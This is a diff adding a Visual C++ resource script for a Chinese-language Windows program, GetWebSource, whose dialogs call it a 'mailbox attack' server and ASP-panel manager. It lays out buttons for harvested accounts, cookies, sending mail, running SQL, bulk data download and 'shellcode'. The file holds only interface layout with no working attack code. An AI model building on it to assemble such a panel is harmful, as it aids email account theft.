@@ -1,0 +1,278 @@
+// Microsoft Visual C++ generated resource script.
+//
+#include "resource.h"
+
+#define APSTUDIO_READONLY_SYMBOLS
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 2 resource.
+//
+#include "afxres.h"
+
+/////////////////////////////////////////////////////////////////////////////
+#undef APSTUDIO_READONLY_SYMBOLS
+
+/////////////////////////////////////////////////////////////////////////////
+// 中文(中华人民共和国) resources
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)
+#ifdef _WIN32
+LANGUAGE LANG_CHINESE, SUBLANG_CHINESE_SIMPLIFIED
+#pragma code_page(936)
+#endif //_WIN32
+
+#ifdef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// TEXTINCLUDE
+//
+
+1 TEXTINCLUDE 
+BEGIN
+    "resource.h\0"
+END
+
+2 TEXTINCLUDE 
+BEGIN
+    "#include ""afxres.h""\r\n"
+    "\0"
+END
+
+3 TEXTINCLUDE 
+BEGIN
+    "#define _AFX_NO_SPLITTER_RESOURCES\r\n"
+    "#define _AFX_NO_OLE_RESOURCES\r\n"
+    "#define _AFX_NO_TRACKER_RESOURCES\r\n"
+    "#define _AFX_NO_PROPERTY_RESOURCES\r\n"
+    "\r\n"
+    "#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)\r\n"
+    "#ifdef _WIN32\r\n"
+    "LANGUAGE 4, 2\r\n"
+    "#pragma code_page(936)\r\n"
+    "#endif //_WIN32\r\n"
+    "#include ""res\\GetWebSource.rc2""  // non-Microsoft Visual C++ edited resources\r\n"
+    "#include ""l.chs\\afxres.rc""          // Standard components\r\n"
+    "#endif\r\n"
+    "\0"
+END
+
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Icon
+//
+
+// Icon with lowest ID value placed first to ensure application icon
+// remains consistent on all systems.
+IDR_MAINFRAME           ICON                    "res\\GetWebSource.ico"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Dialog
+//
+
+IDD_ABOUTBOX DIALOGEX 0, 0, 235, 55
+STYLE DS_SETFONT | DS_MODALFRAME | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "关于 GetWebSource"
+FONT 9, "宋体", 0, 0, 0x0
+BEGIN
+    ICON            IDR_MAINFRAME,IDC_STATIC,11,17,20,20
+    LTEXT           "数据读取程序 3.6 SQL版",IDC_STATIC,40,10,119,8,SS_NOPREFIX
+    LTEXT           "版权所有 (C) 2010",IDC_STATIC,40,25,119,8
+    DEFPUSHBUTTON   "确定",IDOK,178,7,50,14,WS_GROUP
+END
+
+IDD_GETWEBSOURCE_DIALOG DIALOGEX 0, 0, 472, 360
+STYLE DS_SETFONT | DS_MODALFRAME | WS_POPUP | WS_VISIBLE | WS_CAPTION | WS_SYSMENU
+EXSTYLE WS_EX_APPWINDOW
+CAPTION "邮箱攻击服务端管理程序"
+FONT 9, "宋体", 0, 0, 0x1
+BEGIN
+    EDITTEXT        IDC_EDWEBSOURCE,17,284,341,47,ES_MULTILINE | ES_AUTOVSCROLL | ES_AUTOHSCROLL | ES_WANTRETURN | WS_VSCROLL | WS_HSCROLL
+    PUSHBUTTON      "帐号",IDC_BTGET3,237,15,45,23
+    PUSHBUTTON      "cookies",IDC_COOKIES,292,15,45,23
+    PUSHBUTTON      "user表",IDC_USER,419,133,33,14,WS_DISABLED
+    PUSHBUTTON      "jsweb表",IDC_JSWEB,419,153,33,14,WS_DISABLED
+    CONTROL         "List3",IDC_LIST3,"SysListView32",LVS_REPORT | WS_BORDER | WS_TABSTOP,18,70,339,158
+    PUSHBUTTON      "删除信息",IDC_delinf,417,319,43,14
+    EDITTEXT        IDC_ID,377,319,29,14,ES_AUTOHSCROLL
+    PUSHBUTTON      "发送邮件",IDC_BUTTON1,184,15,45,23
+    EDITTEXT        IDC_EDI_SQL,23,242,332,16,ES_AUTOHSCROLL
+    PUSHBUTTON      "执行SQL",IDC_SQL,347,15,45,23,WS_DISABLED
+    GROUPBOX        "数据库管理",IDC_STATIC,7,56,458,216
+    GROUPBOX        "状态：",IDC_STATIC,7,276,357,67
+    PUSHBUTTON      "数据全部下载",IDC_BUTUPdata2,397,15,52,23
+    PUSHBUTTON      "帐号",IDC_inf,369,89,28,14
+    GROUPBOX        "远程数据库",IDC_STATIC,412,71,45,103
+    GROUPBOX        "离线查看",IDC_STATIC,362,71,43,129
+    PUSHBUTTON      "更新",IDC_BUT_NEW,417,180,36,15
+    PUSHBUTTON      "cook",IDC_cook,369,111,28,14
+    PUSHBUTTON      "user",IDC_buser,369,133,28,14,WS_DISABLED
+    PUSHBUTTON      "jsweb",IDC_bjsweb,369,152,28,14,WS_DISABLED
+    PUSHBUTTON      "log",IDC_log,369,175,28,14,WS_DISABLED
+    EDITTEXT        IDC_EDIT1,83,27,24,14,ES_AUTOHSCROLL
+    GROUPBOX        "新信息条数：",IDC_STATIC,69,15,53,31
+    GROUPBOX        "执行SQL语句：",IDC_STATIC,16,233,395,31
+    PUSHBUTTON      "刷新",IDC_BUT_NEW2,420,242,36,15
+    PUSHBUTTON      "shellcode",IDC_getshellcode,375,285,45,17,WS_DISABLED
+    GROUPBOX        "webID",IDC_STATIC,372,309,39,27
+    GROUPBOX        "",IDC_STATIC,7,3,458,50
+    PUSHBUTTON      "服务器配置",IDC_SETWEB,131,15,45,23
+    PUSHBUTTON      "登录",IDC_BUT_LOG,17,17,45,23
+END
+
+IDD_DIALOG1 DIALOGEX 0, 0, 465, 271
+STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "邮箱攻击系统ASP端管理"
+FONT 8, "MS Shell Dlg", 400, 0, 0x1
+BEGIN
+END
+
+IDD_DIALOG2 DIALOGEX 0, 0, 264, 150
+STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "Dialog"
+FONT 8, "MS Shell Dlg", 400, 0, 0x1
+BEGIN
+    DEFPUSHBUTTON   "登录",IDOK,44,115,50,14
+    PUSHBUTTON      "取消",IDCANCEL,151,115,50,14
+    EDITTEXT        IDC_URL,80,41,135,13,ES_AUTOHSCROLL
+    EDITTEXT        IDC_USERNAME,80,63,135,13,ES_AUTOHSCROLL
+    EDITTEXT        IDC_PASSWORD,80,85,135,13,ES_PASSWORD | ES_AUTOHSCROLL
+    GROUPBOX        "",IDC_STATIC,20,29,219,75
+    LTEXT           "网址：",IDC_STATIC,31,44,34,11
+    LTEXT           "用户名：",IDC_STATIC,31,67,34,11
+    LTEXT           "密码：",IDC_STATIC,31,86,34,11
+    LTEXT           "用户登录",IDC_STATIC,110,14,44,9
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Version
+//
+
+VS_VERSION_INFO VERSIONINFO
+ FILEVERSION 3,6,0,1
+ PRODUCTVERSION 3,6,0,1
+ FILEFLAGSMASK 0x3fL
+#ifdef _DEBUG
+ FILEFLAGS 0x1L
+#else
+ FILEFLAGS 0x0L
+#endif
+ FILEOS 0x4L
+ FILETYPE 0x1L
+ FILESUBTYPE 0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "080404b0"
+        BEGIN
+            VALUE "CompanyName", "中和软件"
+            VALUE "FileDescription", "邮箱系统管理程序"
+            VALUE "FileVersion", "3, 6, 0, 1"
+            VALUE "InternalName", "GetWebSource"
+            VALUE "LegalCopyright", "版权所有 (C) 2010"
+            VALUE "OriginalFilename", "GetWebSource.EXE"
+            VALUE "ProductName", "GetWebSource 应用程序"
+            VALUE "ProductVersion", "3, 6, 0, 1"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x804, 1200
+    END
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// DESIGNINFO
+//
+
+#ifdef APSTUDIO_INVOKED
+GUIDELINES DESIGNINFO 
+BEGIN
+    IDD_ABOUTBOX, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 228
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 48
+    END
+
+    IDD_GETWEBSOURCE_DIALOG, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 465
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 353
+    END
+
+    IDD_DIALOG1, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 458
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 264
+    END
+
+    IDD_DIALOG2, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 257
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 143
+    END
+END
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// HTML
+//
+
+IDR_HTML_SETSERVER      HTML                    "setServer.htm"
+IDR_HTML1               HTML                    "res\\html1.htm"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// String Table
+//
+
+STRINGTABLE 
+BEGIN
+    IDS_ABOUTBOX            "关于 GetWebSource(&A)..."
+    IDC_BUTTONONE           "动态按钮"
+END
+
+#endif    // 中文(中华人民共和国) resources
+/////////////////////////////////////////////////////////////////////////////
+
+
+
+#ifndef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 3 resource.
+//
+#define _AFX_NO_SPLITTER_RESOURCES
+#define _AFX_NO_OLE_RESOURCES
+#define _AFX_NO_TRACKER_RESOURCES
+#define _AFX_NO_PROPERTY_RESOURCES
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)
+#ifdef _WIN32
+LANGUAGE 4, 2
+#pragma code_page(936)
+#endif //_WIN32
+#include "res\GetWebSource.rc2"  // non-Microsoft Visual C++ edited resources
+#include "l.chs\afxres.rc"          // Standard components
+#endif
+
+/////////////////////////////////////////////////////////////////////////////
+#endif    // not APSTUDIO_INVOKED
+
